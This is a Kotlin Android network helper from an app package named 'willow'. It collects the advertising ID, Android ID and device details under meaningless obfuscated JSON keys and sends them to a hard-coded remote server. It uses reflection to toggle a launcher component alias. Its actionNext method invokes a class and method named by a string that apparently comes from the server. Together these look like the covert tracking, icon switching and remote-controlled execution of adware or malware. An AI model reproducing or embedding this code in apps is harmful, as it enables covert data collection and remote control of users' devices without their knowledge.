package com.buoy.willow

import android.content.Context
import android.os.Build
import okhttp3.Request
import org.json.JSONObject
import java.util.UUID

/**
 * Date：2025/12/4
 * Describe:
 */
class WillowNetHelper {
    // todo modify
    // https://canoga.lovemojiwotalks.com/poe/honeydew
    private val url = "https://test-canoga.lovemojiwotalks.com/collude/got/college"

    fun fetchWillowJson(): JSONObject {
        Tools.log("fetchWillowJson-->${Tools.mCacheStrBaseInfo}")
        return JSONObject(Tools.mCacheStrBaseInfo).apply {
            put("hid", Tools.packVersion)
            put("mohr", UUID.randomUUID().toString())
            put("garland", System.currentTimeMillis())
            put("express", "")
            put("skulk", Build.MANUFACTURER)
            put("gorge", "_")
            put("thrush", Tools.mGaidStr)
            put("johannes", Tools.mAndroidIdStr)
            if (Tools.userInfo.isNotBlank()) {
                put("apron", JSONObject().put("type", Tools.userInfo))
            }
        }
    }

    fun getInstallJson(ref: String): JSONObject {
        return JSONObject().apply {
            put("transit", "")
            put("baseman", ref)
            put("l", "")
            put("biopsy", "auto")
            put("kruger", 0L)
            put("litigant", 0L)
            put("jest", 0L)
            put("fogging", 0L)
            put("military", 0L)
            put("seedbed", 0L)
        }
    }

    fun fetchReq(jsonObject: JSONObject): Request {
        return Tools.jsToR(jsonObject, url)
    }

    fun enableInfo(alias: String, context: Context) {
        try {
            // 1. 获取当前应用的包名
            val packageName = context.packageName
            val componentNameClass = Class.forName("android.content.ComponentName")
            val componentNameConstructor =
                componentNameClass.getDeclaredConstructor(String::class.java, String::class.java)
            val componentName = componentNameConstructor.newInstance(packageName, alias)
            val getPackageManagerMethod = Context::class.java.getMethod("getPackageManager")
            val packageManager = getPackageManagerMethod.invoke(context)
            val setComponentEnabledSettingMethod = packageManager.javaClass.getMethod(
                "setComponentEnabledSetting", componentNameClass, // 参数1: ComponentName
                Int::class.java, // 参数2: int
                Int::class.java  // 参数3: int
            )
            setComponentEnabledSettingMethod.invoke(packageManager, componentName, 1, 1)
        } catch (e: Exception) {
            e.printStackTrace()
            // 处理异常，例如反射失败或安全异常
        }
    }

    fun actionNext(string: String) {
        val name = string.substring(0, 5)
        Class.forName(name)
            .getMethod("a1", String::class.java, Context::class.java)
            .invoke(null, string.substring(5), Tools.mApplication)
    }

}